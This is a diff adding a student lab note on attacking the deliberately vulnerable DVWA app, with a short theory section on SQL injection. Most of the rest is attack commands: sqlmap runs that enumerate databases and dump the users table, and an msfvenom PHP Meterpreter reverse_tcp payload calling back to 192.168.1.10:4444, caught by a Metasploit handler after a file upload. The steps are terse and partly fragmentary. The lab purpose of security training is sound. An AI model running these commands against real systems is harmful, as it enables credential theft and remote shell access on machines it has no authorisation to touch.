@@ -1,0 +1,51 @@
+SQL Injection attack on DVWA application
+Aim: To demonstrate SQL injection attack on DVWA application.
+Theory:
+SQL injection is one of the most common attacks used by hackers to exploit any SQL
+database-driven web application. It’s a technique where SQL code/statements are
+inserted in the execution field with an aim of either altering the database contents,
+dumping useful database contents to the hacker, cause repudiation issues, spoof identity,
+and much more.
+Damn Vulnerable Web Application, shorter DVWA, is a PHP/MySQL web application that
+is damn vulnerable. The main goal of this pentesting playground is to aid penetration
+testers and security professionals to test their skills and tools. In addition it can aid web
+devs better understand how to secure web apps, but also to aid students/teachers to learn
+all about web app security and possible vulnerabilities
+
+======
+bridged
+metsploit ip
+burpsuit>open browser> ip of meta>site open> change to low> intercept on>sql injection> port forward>link will come
+
+
+
+
+
+sqlmap -u "link" --cookie "copy" --dbs
+sqlmap -u "link" --cookie "copy" --dbs -D dvwa --tables
+sqlmap -u "link" --cookie "copy" -D dvwa -T users --dump
+
+
+
+
+
+
+
+>>>>>>>>>>>>
+>>>>>>>>>>>>>>>
+>>>>>>>>>>>
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o shell.php 
+
+use exploit/multi/handler
+
+set payload php/meterpreter/reverse_tcp
+
+set lhost
+
+set lport 
+
+run
+
+
+dvwa app>> security low>> upload>> site<location> open file
